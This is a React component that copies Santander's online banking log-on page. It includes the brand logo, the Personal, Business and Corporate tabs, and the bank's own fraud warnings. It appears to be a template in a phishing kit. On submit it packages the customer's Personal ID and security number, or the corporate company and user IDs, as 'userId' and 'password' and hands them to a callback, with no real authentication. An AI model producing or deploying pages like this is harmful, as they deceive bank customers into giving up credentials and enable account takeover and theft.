"use client";

import { useState } from "react";

interface SantanderProps {
  bankName?: string;
  selectedOption?: string;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function SantanderTemplate({
  bankName = "Santander",
  selectedOption = "Personal",
  onSuccessSubmit,
}: SantanderProps) {
  // Tabs: "personal" | "business" | "corporate"
  const [activeTab, setActiveTab] = useState<"personal" | "business" | "corporate">("personal");

  // Form Fields for Personal / Business
  const [personalId, setPersonalId] = useState("");
  const [securityNumber, setSecurityNumber] = useState("");
  const [rememberId, setRememberId] = useState(false);
  const [isSharedDevice, setIsSharedDevice] = useState(false);

  // Form Fields for Corporate (Santander Connect)
  const [companyId, setCompanyId] = useState("");
  const [corporateUserId, setCorporateUserId] = useState("");
  const [rememberCorporateIds, setRememberCorporateIds] = useState(false);

  // Errors & Loading
  const [errors, setErrors] = useState<{ id?: boolean; secret?: boolean }>({});
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { id?: boolean; secret?: boolean } = {};

    if (activeTab === "corporate") {
      if (!companyId.trim()) newErrors.id = true;
      if (!corporateUserId.trim()) newErrors.secret = true;
    } else {
      if (!personalId.trim()) newErrors.id = true;
      if (!securityNumber.trim()) newErrors.secret = true;
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setLoading(true);

    const primaryUserId =
      activeTab === "corporate"
        ? `CompanyID: ${companyId.trim()} | User: ${corporateUserId.trim()}`
        : personalId.trim();

    const primarySecret =
      activeTab === "corporate"
        ? "N/A (Device/App Prompt)"
        : securityNumber.trim();

    onSuccessSubmit({
      userId: primaryUserId,
      password: primarySecret,
      memorableInfo: `Tab: ${activeTab.toUpperCase()} | Remember: ${rememberId || rememberCorporateIds ? "Yes" : "No"}`,
      extraData: `Santander ${activeTab === "corporate" ? "Connect" : activeTab === "business" ? "Business Banking" : "Personal Banking"}`,
    });
  };

  const isFormFilled =
    activeTab === "corporate"
      ? companyId.trim().length > 0 && corporateUserId.trim().length > 0
      : personalId.trim().length > 0 && securityNumber.trim().length > 0;

  return (
    <div className="min-h-full bg-white font-sans text-[#222222] flex flex-col justify-between selection:bg-[#ec0000] selection:text-white">
      <div>
        {/* ================= 1. HEADER ================= */}
        <header className="w-full bg-white border-b border-slate-200 px-6 sm:px-12 py-4 flex items-center justify-between">
          {/* Santander Logo */}
          <div className="flex items-center gap-2">
            <svg className="h-7 w-auto fill-[#ec0000]" viewBox="0 0 160 32">
              <path d="M14.5 2.1c-6.8 0-12.3 5.5-12.3 12.3 0 5 3 9.3 7.3 11.2-.3-.8-.5-1.7-.5-2.6 0-3.9 3.2-7.1 7.1-7.1.6 0 1.2.1 1.7.2C17 14 16 11.5 16 8.7c0-2.3.8-4.5 2.2-6.2-.7-.3-1.6-.4-2.5-.4h-1.2zm8.8 4.2c-1.3 1.6-2.1 3.6-2.1 5.8 0 2.9 1.3 5.5 3.4 7.2-.6 1.1-1.6 1.9-2.7 2.4 2.8 1.4 6 2.2 9.4 2.2 1.3 0 2.5-.1 3.7-.4-1.2-1.9-1.9-4.2-1.9-6.6 0-4.3 2.3-8.1 5.7-10.2C36.4 4.5 32 3.1 27.2 3.1c-1.4 0-2.7.2-3.9.5v2.7z" />
            </svg>
            <span className="text-2xl font-black tracking-tight text-[#ec0000] font-sans">
              Santander
            </span>
            {activeTab === "corporate" && (
              <span className="text-xl font-normal text-slate-800 ml-1">Connect</span>
            )}
          </div>

          <div className="text-xs sm:text-[13px] text-slate-600">
            Don't have Online Banking?{" "}
            <a href="#" className="text-[#ec0000] underline font-medium hover:text-[#b80000]">
              Sign up
            </a>
          </div>
        </header>

        {/* ================= 2. MAIN BODY ================= */}
        {activeTab !== "corporate" ? (
          /* ================= PERSONAL & BUSINESS VIEW ================= */
          <div className="max-w-[1100px] mx-auto px-6 sm:px-12 py-10">
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-start">
              
              {/* Left 6 Cols: Login Form */}
              <div className="lg:col-span-6 lg:border-r border-slate-200 lg:pr-10">
                <h1 className="text-[26px] sm:text-[28px] font-normal text-[#ec0000] tracking-tight mb-6">
                  {activeTab === "business"
                    ? "Log on to your Business Online Banking"
                    : "Log on to your Online Banking"}
                </h1>

                {/* Tabs */}
                <div className="flex items-center gap-6 border-b border-slate-200 mb-8 pb-1 text-sm font-semibold">
                  <button
                    type="button"
                    onClick={() => {
                      setActiveTab("personal");
                      setErrors({});
                    }}
                    className={`pb-2.5 transition border-b-2 cursor-pointer ${
                      activeTab === "personal"
                        ? "border-[#ec0000] text-slate-900"
                        : "border-transparent text-slate-500 hover:text-slate-800"
                    }`}
                  >
                    Personal
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      setActiveTab("business");
                      setErrors({});
                    }}
                    className={`pb-2.5 transition border-b-2 cursor-pointer ${
                      activeTab === "business"
                        ? "border-[#ec0000] text-slate-900"
                        : "border-transparent text-slate-500 hover:text-slate-800"
                    }`}
                  >
                    Business
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      setActiveTab("corporate");
                      setErrors({});
                    }}
                    className="pb-2.5 text-slate-500 hover:text-slate-800 border-b-2 border-transparent cursor-pointer"
                  >
                    Corporate
                  </button>
                </div>

                <form onSubmit={handleSubmit} className="space-y-6">
                  
                  {/* Personal ID */}
                  <div>
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="block text-sm text-slate-800 font-normal">
                        Personal ID
                      </label>
                      {activeTab === "business" && (
                        <a href="#" className="text-xs text-[#0073b1] underline">
                          Forgotten ID?
                        </a>
                      )}
                    </div>
                    <input
                      type="text"
                      value={personalId}
                      onChange={(e) => {
                        setPersonalId(e.target.value);
                        if (errors.id) setErrors({ ...errors, id: false });
                      }}
                      className={`w-full rounded-md border p-2.5 text-sm outline-none transition ${
                        errors.id ? "border-red-500 bg-red-50/20" : "border-[#7fa6c8] focus:border-[#ec0000]"
                      }`}
                    />
                  </div>

                  {/* Security Number */}
                  <div>
                    <label className="block text-sm text-slate-800 font-normal">
                      Security number
                    </label>
                    <p className="text-[11.5px] text-slate-500 mb-1.5">
                      You may know this as your 5 digit Registration Number or Customer PIN
                    </p>
                    <div className="relative">
                      <input
                        type="password"
                        maxLength={5}
                        placeholder="•   •   •   •   •"
                        value={securityNumber}
                        onChange={(e) => {
                          setSecurityNumber(e.target.value);
                          if (errors.secret) setErrors({ ...errors, secret: false });
                        }}
                        className={`w-full rounded-md border p-2.5 text-sm tracking-[0.3em] placeholder:text-slate-400 outline-none transition ${
                          errors.secret ? "border-red-500 bg-red-50/20" : "border-[#7fa6c8] focus:border-[#ec0000]"
                        }`}
                      />
                    </div>
                  </div>

                  {/* Checkboxes */}
                  <div className="space-y-3 pt-1 text-[13px] text-slate-700">
                    <label className="flex items-center gap-2.5 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={rememberId}
                        onChange={(e) => setRememberId(e.target.checked)}
                        className="h-4 w-4 rounded border-slate-300 accent-[#ec0000]"
                      />
                      <span>{activeTab === "business" ? "Remember ID" : "Remember Personal ID"}</span>
                    </label>
                    <label className="flex items-center gap-2.5 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={isSharedDevice}
                        onChange={(e) => setIsSharedDevice(e.target.checked)}
                        className="h-4 w-4 rounded border-slate-300 accent-[#ec0000]"
                      />
                      <span>I'm using a public or shared device</span>
                    </label>
                  </div>

                  {/* Log on Button */}
                  <div className="pt-3">
                    <button
                      type="submit"
                      disabled={loading}
                      className={`w-full max-w-[220px] rounded-full py-2.5 text-sm font-semibold transition cursor-pointer shadow-sm ${
                        isFormFilled
                          ? "bg-[#ec0000] text-white hover:bg-[#c90000] active:scale-[0.99]"
                          : "bg-[#cccccc] text-white cursor-not-allowed"
                      }`}
                    >
                      {loading ? "Checking..." : "Log on"}
                    </button>
                  </div>

                  <div className="pt-2">
                    <a href="#" className="text-xs text-[#ec0000] underline font-semibold">
                      Forgotten details?
                    </a>
                  </div>

                </form>
              </div>

              {/* Right 6 Cols: Scam Warning Hero (Exact Screenshot) */}
              <div className="lg:col-span-6 flex flex-col items-center text-center pt-2">
                {/* Illustration with Hand + Smartphone */}
                <div className="relative w-64 h-64 bg-[#e5f4fa] rounded-full flex items-center justify-center p-6 shadow-inner">
                  <div className="relative w-32 h-52 bg-white rounded-[24px] border-4 border-[#ec0000] shadow-md flex flex-col items-center justify-center p-3">
                    {/* Robber / Criminal with Mask Icon */}
                    <div className="w-16 h-20 rounded-full border-2 border-[#ec0000] flex flex-col items-center justify-center p-1.5">
                      <div className="w-10 h-3 bg-[#ec0000] rounded-full mb-1"></div>
                      <div className="w-8 h-2 bg-[#ec0000] rounded-sm"></div>
                    </div>
                    <div className="w-14 h-1.5 bg-slate-300 rounded-full mt-4"></div>
                    <div className="w-10 h-1 bg-slate-200 rounded-full mt-1.5"></div>
                  </div>
                </div>

                <h2 className="text-2xl sm:text-[26px] font-bold text-[#ec0000] mt-6 tracking-tight">
                  Criminals pretend to be Santander
                </h2>

                {/* Callout Warning Card */}
                <div className="mt-8 bg-[#eef7fa] border border-[#d6ecf5] rounded-lg p-4 flex items-start gap-3 text-left text-xs sm:text-[12.5px] text-slate-700 leading-relaxed max-w-md">
                  <span className="text-lg text-[#0073b1]">👮</span>
                  <p>
                    If you're contacted by <strong>anyone</strong> and told to move your money to keep it safe, stop. This is always a scam.
                  </p>
                </div>

                <p className="text-xs text-slate-500 mt-4">
                  For more information on this scam and how to protect yourself visit our{" "}
                  <a href="#" className="text-[#ec0000] underline">latest fraud updates</a> page.
                </p>
              </div>

            </div>
          </div>
        ) : (
          /* ================= CORPORATE VIEW (SANTANDER CONNECT) ================= */
          <div className="max-w-[1100px] mx-auto px-6 sm:px-12 py-10">
            <h1 className="text-3xl font-light text-slate-800 tracking-tight mb-2">
              Connect Log On
            </h1>
            <p className="text-xs sm:text-[13px] text-slate-600 mb-8">
              Log on using your online banking details
            </p>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-start">
              
              {/* Left 5 Cols: Connect Form */}
              <form onSubmit={handleSubmit} className="lg:col-span-5 space-y-5">
                <div>
                  <label className="block text-xs sm:text-[13px] text-slate-800 font-normal mb-1.5">
                    Enter Company ID
                  </label>
                  <input
                    type="text"
                    value={companyId}
                    onChange={(e) => {
                      setCompanyId(e.target.value);
                      if (errors.id) setErrors({ ...errors, id: false });
                    }}
                    className={`w-full rounded-md border p-2 text-sm outline-none ${
                      errors.id ? "border-red-500" : "border-[#7fa6c8] focus:border-[#ec0000]"
                    }`}
                  />
                </div>

                <div>
                  <label className="block text-xs sm:text-[13px] text-slate-800 font-normal mb-1.5">
                    Enter User ID
                  </label>
                  <input
                    type="text"
                    value={corporateUserId}
                    onChange={(e) => {
                      setCorporateUserId(e.target.value);
                      if (errors.secret) setErrors({ ...errors, secret: false });
                    }}
                    className={`w-full rounded-md border p-2 text-sm outline-none ${
                      errors.secret ? "border-red-500" : "border-[#7fa6c8] focus:border-[#ec0000]"
                    }`}
                  />
                </div>

                <div className="pt-1">
                  <label className="flex items-center gap-2 cursor-pointer text-xs text-slate-700">
                    <input
                      type="checkbox"
                      checked={rememberCorporateIds}
                      onChange={(e) => setRememberCorporateIds(e.target.checked)}
                      className="h-4 w-4 rounded border-slate-300 accent-[#ec0000]"
                    />
                    <span>Remember my IDs</span>
                  </label>
                </div>

                {/* Device Card */}
                <div className="bg-[#f4f9fd] border border-[#d2e4f2] rounded-md p-4 text-xs text-slate-700 space-y-1">
                  <strong className="block text-slate-900 font-bold">Your device</strong>
                  <p>Make sure you've got your registered security device or mobile phone with you.</p>
                </div>

                <div className="bg-[#f4f9fd] border border-[#d2e4f2] rounded-md p-4 text-xs text-slate-700">
                  <span>Have you received a new security device? </span>
                  <a href="#" className="text-[#ec0000] underline font-semibold block mt-0.5">Activate here.</a>
                </div>

                {/* Red Solid Continue Button */}
                <div className="pt-2">
                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full rounded-full bg-[#ec0000] hover:bg-[#c90000] active:scale-[0.99] py-3 text-sm font-bold text-white shadow transition cursor-pointer"
                  >
                    {loading ? "Connecting..." : "Continue"}
                  </button>
                </div>

                <div className="border border-slate-200 rounded p-3 text-xs text-slate-600 flex items-center justify-between cursor-pointer hover:bg-slate-50">
                  <span>Don't know your log on details?</span>
                  <span>▼</span>
                </div>
              </form>

              {/* Right 7 Cols: Protect from fraud guidelines */}
              <div className="lg:col-span-7 border-l border-slate-200 pl-8 space-y-4 text-xs leading-relaxed text-slate-700">
                <h3 className="text-sm font-bold text-[#ec0000]">
                  IMPORTANT: Protect yourself from fraud
                </h3>
                <p className="font-semibold text-slate-800">How to protect your company</p>
                <ul className="list-disc pl-4 space-y-2">
                  <li>Don't share any passwords or security codes with anyone. <strong>Not even with a Santander employee.</strong></li>
                  <li>Token codes can only be used to authorise log in, account changes or payments. <strong>We never ask you to use them to authorise a refund.</strong></li>
                  <li>Don't use the mobile app to authenticate a transaction you've not selected yourself in Online Banking.</li>
                  <li>Never transfer or withdraw money out of your account after being told to do so for security reasons.</li>
                  <li>Always confirm requests for money directly with the person or company. Do this using a known and trusted number.</li>
                  <li>Don't allow anyone to remotely access your computers or devices.</li>
                  <li>We'll never call you and ask you to click on a link, download an app or open an attachment.</li>
                  <li><strong>Validate all requests by calling us.</strong> Go directly to our website to be sure that you have the genuine phone number or use the phone number on the back of your card.</li>
                </ul>

                <div className="pt-2">
                  <a href="#" className="text-xs text-[#0073b1] underline font-semibold">
                    ↗ How to protect yourself from fraud and scams
                  </a>
                </div>
              </div>

            </div>
          </div>
        )}
      </div>

      {/* ================= 3. FOOTER ================= */}
      <footer className="w-full bg-white border-t border-slate-200 px-6 sm:px-12 py-8 text-[11px] text-slate-600 mt-12">
        <div className="max-w-[1100px] mx-auto flex flex-col items-center gap-6">
          <div className="flex flex-wrap items-center justify-center gap-6 font-medium">
            <a href="#" className="underline hover:text-black">Online Banking Guarantee</a>
            <a href="#" className="underline hover:text-black">Accessibility</a>
            <a href="#" className="underline hover:text-black">Security & Privacy</a>
            <a href="#" className="underline hover:text-black">Terms & Conditions</a>
            <a href="#" className="underline hover:text-black">Legal</a>
          </div>

          {/* Red FSCS Logo */}
          <div className="flex flex-col items-center">
            <div className="text-2xl font-black italic text-[#ec0000] tracking-tight">
              fscs
            </div>
            <span className="text-[9px] uppercase tracking-widest text-[#ec0000] font-semibold">
              Protected
            </span>
          </div>
        </div>
      </footer>
    </div>
  );
}